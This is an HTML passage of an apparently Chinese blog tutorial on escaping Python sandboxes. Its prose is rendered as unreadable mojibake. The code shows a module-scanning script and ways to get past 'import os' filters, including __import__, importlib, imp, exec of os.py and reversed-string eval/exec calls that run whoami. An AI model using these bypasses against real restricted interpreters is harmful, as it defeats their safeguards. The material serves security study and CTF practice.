<span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;secretstorage&#x27;</span>, <span class="hljs-string">&#x27;Quirks&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;UbuntuDrivers&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;selectors&#x27;</span>, <span class="hljs-string">&#x27;UbuntuSystemService&#x27;</span>, <span class="hljs-string">&#x27;asn1crypto&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;UpdateManager&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;ipaddress&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;asyncio&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;_asyncio&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;janitor&#x27;</span>, <span class="hljs-string">&#x27;simplejson&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;_blake2&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyring&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;_bootlocale&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;six&#x27;</span>, <span class="hljs-string">&#x27;_bz2&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;language_support_pkgs&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;_cffi_backend&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;launchpadlib&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;brlapi&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;socketserver&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;louis&#x27;</span>, <span class="hljs-string">&#x27;softwareproperties&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;speechd&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;lzma&#x27;</span>, <span class="hljs-string">&#x27;speechd_config&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;cairo&#x27;</span>, <span class="hljs-string">&#x27;macaroonbakery&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;_collections_abc&#x27;</span>, <span class="hljs-string">&#x27;certifi&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;_compat_pickle&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;_compression&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;_crypt&#x27;</span>, <span class="hljs-string">&#x27;chardet&#x27;</span>, <span class="hljs-string">&#x27;mako&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;markupsafe&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;statistics&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;_datetime&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;modual_test&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;_dbm&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;_dbus_bindings&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;_dbus_glib_bindings&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;nacl&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;_decimal&#x27;</span>, <span class="hljs-string">&#x27;concurrent&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;configparser&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;systemd&#x27;</span>, <span class="hljs-string">&#x27;_gdbm&#x27;</span>, <span class="hljs-string">&#x27;copyreg&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;cryptography&#x27;</span>, <span class="hljs-string">&#x27;oauth&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_imp&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;olefile&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;cups&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;cupsext&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;cupshelpers&#x27;</span>, <span class="hljs-string">&#x27;orca&#x27;</span>, <span class="hljs-string">&#x27;_lzma&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_markupbase&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;dbus&#x27;</span>, <span class="hljs-string">&#x27;pathlib&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;deb822&#x27;</span>, <span class="hljs-string">&#x27;pcardext&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_opcode&#x27;</span>, <span class="hljs-string">&#x27;debconf&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_operator&#x27;</span>, <span class="hljs-string">&#x27;debian&#x27;</span>, <span class="hljs-string">&#x27;pexpect&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;debian_bundle&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;_pickle&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>, <span class="hljs-string">&#x27;defer&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_pydecimal&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;pkg_resources&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;typing&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;distro_info&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;ufw&#x27;</span>, <span class="hljs-string">&#x27;_sha1&#x27;</span>, <span class="hljs-string">&#x27;distro_info_test&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_sha3&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;urllib3&#x27;</span>, <span class="hljs-string">&#x27;_signal&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;usbcreator&#x27;</span>, <span class="hljs-string">&#x27;_sitebuiltins&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;problem_report&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;enum&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;venv&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;faulthandler&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;wadllib&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;ptyprocess&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_stat&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_string&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pyatspi&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;xdg&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_testbuffer&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;xkit&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;pygtkcompat&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_testimportmultiple&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span><br>]<br><br>methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><br>results = &#123;&#125;<br><span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> all_modules_Python3:<br>    results[module] = &#123;<br>        <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;result&#x27;</span>: &#123;&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        m = <span class="hljs-built_in">__import__</span>(module)<br>        attrs = <span class="hljs-built_in">dir</span>(m)<br>        <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:<br>            <span class="hljs-keyword">if</span> method <span class="hljs-keyword">in</span> attrs:<br>                result = <span class="hljs-string">&#x27;yes&#x27;</span><br>                results[module][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                result = <span class="hljs-string">&#x27;no&#x27;</span><br><br>            results[module][<span class="hljs-string">&#x27;result&#x27;</span>][method] = result<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]&#x27;</span> + result)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r])<br></code></pre></td></tr></table></figure><p>æ•ˆæœæ˜¯è¿™æ ·ï¼š</p><img src="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20250124202651867.png" class title="image-20250124202651867"><h2 id="ç¦æ­¢import-os"><a href="#ç¦æ­¢import-os" class="headerlink" title="ç¦æ­¢import os"></a>ç¦æ­¢import os</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> importlib<br>importlib.import_module(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> imp<br><br><span class="hljs-comment"># æŸ¥æ‰¾ &#x27;os&#x27; æ¨¡å—</span><br>file, path, description = imp.find_module(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-comment"># åŠ è½½ &#x27;os&#x27; æ¨¡å—</span><br>os_module = imp.load_module(<span class="hljs-string">&#x27;os&#x27;</span>, file, path, description)<br><span class="hljs-comment"># è®¿é—® &#x27;os&#x27; æ¨¡å—ä¸­çš„ &#x27;system&#x27; å‡½æ•°</span><br>os_module.system(<span class="hljs-string">&#x27;echo Hello, World!&#x27;</span>)<br><span class="hljs-keyword">or</span><br>execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-comment">#é€šç”¨</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.11/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">exec</span>(f.read())<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¦‚æœç¦ç”¨äº†import osï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡ï¼Œå¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ä»¥å°è¯•<code>__import__</code>ï¼š<code>__import__(&#39;os&#39;)</code>ï¼Œ<code>__import__</code>è¢«ç¦äº†è¿˜æœ‰ <code>importlib</code>(Python3.x)ï¼Œimp(Python2.x)ï¼Œexecfile()ï¼ˆPython2.xï¼‰ç­‰ç­‰</p><p>æœ€åä¸¤ç§æ–¹æ³•éƒ½éœ€è¦åº“çš„è·¯å¾„ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯é»˜è®¤çš„ï¼Œè¿˜æœ‰æ–¹æ³•æ‰¾è·¯å¾„çš„è¯å°±æ˜¯ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">print</span>(sys.path)<br></code></pre></td></tr></table></figure><h2 id="å…³é”®å­—è¿‡æ»¤"><a href="#å…³é”®å­—è¿‡æ»¤" class="headerlink" title="å…³é”®å­—è¿‡æ»¤"></a>å…³é”®å­—è¿‡æ»¤</h2><p>ä»£ç ä¸­è¦æ˜¯å‡ºç° <code>os</code>ï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ osï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">&#x27;o&#x27;</span><br>a = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åˆ©ç”¨ <code>eval</code> æˆ–è€… <code>exec</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>å¯¹äºç»•è¿‡æ“ä½œè¿˜æœ‰å¾ˆå¤šæ¯”å¦‚è¯´ï¼šé€†åºã€å˜é‡æ‹¼æ¥ã€base64ã€hexã€rot13ç­‰ç­‰</p><h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p><code>sys.modules</code> æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‡Œé¢å‚¨å­˜äº†åŠ è½½è¿‡çš„æ¨¡å—ä¿¡æ¯ã€‚å¦‚æœ Python æ˜¯<strong>åˆšå¯åŠ¨</strong>çš„è¯ï¼Œæ‰€åˆ—å‡ºçš„æ¨¡å—å°±æ˜¯è§£é‡Šå™¨åœ¨<strong>å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„æ¨¡å—</strong>ã€‚æœ‰äº›åº“ä¾‹å¦‚ <code>os</code> æ˜¯é»˜è®¤è¢«åŠ è½½è¿›æ¥çš„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼ŒåŸå› åœ¨äº sys.modules ä¸­æœªç» import åŠ è½½çš„æ¨¡å—å¯¹å½“å‰ç©ºé—´æ˜¯ä¸å¯è§çš„ã€‚</p><p>å¦‚æœå°† os ä» sys.modules ä¸­å‰”é™¤æˆ–è€…æ”¹å˜ï¼Œos å°±å½»åº•æ²¡æ³•ç”¨äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span 